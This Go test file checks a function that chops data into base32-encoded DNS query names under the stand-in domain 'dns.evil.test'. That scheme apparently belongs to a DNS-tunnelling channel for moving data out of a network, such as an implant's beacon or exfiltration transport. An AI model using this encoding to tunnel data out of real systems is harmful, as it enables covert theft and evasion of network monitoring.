//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base32"
	"strconv"
	"strings"
	"testing"
)

func TestBuildDNSQueryNamesEmpty(t *testing.T) {
	DNSDomain = "dns.evil.test"
	names := buildDNSQueryNames(strings.Repeat("a", 32), nil)
	if len(names) != 1 {
		t.Fatalf("empty body must yield a single query, got %d", len(names))
	}
	want := strings.Repeat("a", 32) + ".dns." + DNSDomain
	if names[0] != want {
		t.Fatalf("unexpected empty-body query: %s", names[0])
	}
}

func TestBuildDNSQueryNamesFragments(t *testing.T) {
	DNSDomain = "dns.evil.test"
	uuid := strings.Repeat("b", 32)

	// 200 bytes → 4 fragments at 57 bytes each
	body := make([]byte, 200)
	for i := range body {
		body[i] = byte(i)
	}
	names := buildDNSQueryNames(uuid, body)
	if len(names) != 4 {
		t.Fatalf("expected 4 fragments, got %d", len(names))
	}

	frags := make([][]byte, len(names))
	for i, n := range names {
		if len(n) > 253 {
			t.Fatalf("fragment %d qname exceeds 253 chars: %d", i, len(n))
		}
		for _, label := range strings.Split(strings.TrimSuffix(n, "."), ".") {
			if len(label) > 63 {
				t.Fatalf("fragment %d has overlong label %q", i, label)
			}
		}
		// middle section is "<meta>.<base32...>" appended to the uuid label.
		mid := strings.Replace(n, uuid+".", "", 1)
		mid = strings.TrimSuffix(mid, ".dns."+DNSDomain)
		head, dataLabels, ok := strings.Cut(mid, ".")
		if !ok {
			t.Fatalf("fragment %d missing meta: %s", i, mid)
		}
		meta, idxStr, ok := strings.Cut(head, "_")
		if !ok {
			t.Fatalf("fragment %d bad meta: %s", i, head)
		}
		idx, err := strconv.Atoi(idxStr)
		if err != nil {
			t.Fatalf("fragment %d bad index: %v", i, err)
		}
		_ = meta
		data := strings.ReplaceAll(dataLabels, ".", "")
		raw, err := decodeB32NoPad(data)
		if err != nil {
			t.Fatalf("fragment %d base32 decode: %v", i, err)
		}
		frags[idx] = raw
	}

	var recombined []byte
	for _, f := range frags {
		recombined = append(recombined, f...)
	}
	if string(recombined) != string(body) {
		t.Fatalf("fragment reassembly mismatch: got %d bytes want %d", len(recombined), len(body))
	}
}

func TestBuildDNSQueryNamesSingleFits(t *testing.T) {
	DNSDomain = "dns.evil.test"
	body := make([]byte, 57)
	for i := range body {
		body[i] = 0x41
	}
	names := buildDNSQueryNames(strings.Repeat("c", 32), body)
	if len(names) != 1 {
		t.Fatalf("57-byte body must fit one fragment, got %d", len(names))
	}
	if len(names[0]) > 253 {
		t.Fatalf("qname too long: %d", len(names[0]))
	}
}

func TestBase32FragmentRoundTripSizes(t *testing.T) {
	// Every fragment size from 1..57 must survive base32 encode→trim→decode.
	for n := 1; n <= dnsFragmentMaxBody; n++ {
		in := make([]byte, n)
		for i := range in {
			in[i] = byte(i * 7)
		}
		enc := base32.StdEncoding.EncodeToString(in)
		enc = strings.TrimRight(enc, "=")
		raw, err := decodeB32NoPad(enc)
		if err != nil {
			t.Fatalf("size %d: decode failed: %v", n, err)
		}
		if string(raw) != string(in) {
			t.Fatalf("size %d: roundtrip mismatch", n)
		}
	}
}

func decodeB32NoPad(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	if pad := 8 - len(s)%8; pad < 8 {
		s += strings.Repeat("=", pad)
	}
	return base32.StdEncoding.DecodeString(s)
}